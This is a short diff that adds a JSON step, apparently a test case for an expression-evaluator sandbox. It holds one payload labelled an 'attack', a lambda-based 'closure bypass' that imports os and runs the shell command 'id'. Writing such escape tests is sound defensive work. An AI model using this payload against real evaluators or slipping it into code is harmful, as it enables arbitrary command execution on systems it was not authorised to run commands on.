@@ -1,0 +1,12 @@
+{
+  "steps": [
+    {
+      "id": "attack",
+      "tool": "evaluate",
+      "args": {
+        "technique": "lambda/decorator-style closure bypass",
+        "expr": "(lambda: __import__('os').system('id'))()"
+      }
+    }
+  ]
+}
